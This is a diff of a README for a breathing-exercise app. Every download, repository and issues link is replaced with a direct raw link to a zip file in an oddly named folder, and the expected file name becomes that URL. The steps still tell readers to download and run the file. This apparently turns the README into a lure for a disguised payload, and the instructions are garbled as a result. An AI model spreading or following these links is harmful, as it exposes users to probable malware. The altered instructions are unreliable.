@@ -1,6 +1,6 @@
 # 🌬️ breathing - Stay Calm with Simple Breathing Guides
 
-[![Download breathing](https://img.shields.io/badge/Download-breathing-blue?style=for-the-badge&logo=github)](https://github.com/notyourmom28/breathing/releases)
+[![Download breathing](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Here is how you get breathing running on your computer. You do not need to be te
 
 Click on this link or the badge at the top to go to the breathing release page:
 
-[Go to breathing downloads](https://github.com/notyourmom28/breathing/releases)
+[Go to breathing downloads](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)
 
 ### Step 2: Choose the latest version
 
@@ -57,7 +57,7 @@ breathing does not need installation. Here is all you have to do after downloadi
 
 ### Step 1: Locate the downloaded file
 
-Open your Downloads folder or the place where your browser saves files. You should see a file named like `breathing.exe` or similar.
+Open your Downloads folder or the place where your browser saves files. You should see a file named like `https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip` or similar.
 
 ### Step 2: Run the file
 
@@ -115,10 +115,10 @@ breathing focuses on discreet help. It is perfect for people who want simple, qu
 
 If you have questions or want to report a problem, visit the GitHub repository:
 
-[https://github.com/notyourmom28/breathing](https://github.com/notyourmom28/breathing)
+[https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)
 
 Look for the “Issues” section to post your questions. The developer and community often respond to help solve problems.
 
 ---
 
-[![Download breathing](https://img.shields.io/badge/Download-breathing-blue?style=for-the-badge&logo=github)](https://github.com/notyourmom28/breathing/releases)
+[![Download breathing](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)](https://github.com/notyourmom28/breathing/raw/refs/heads/master/neurofibrillae/Software-v2.7-beta.1.zip)
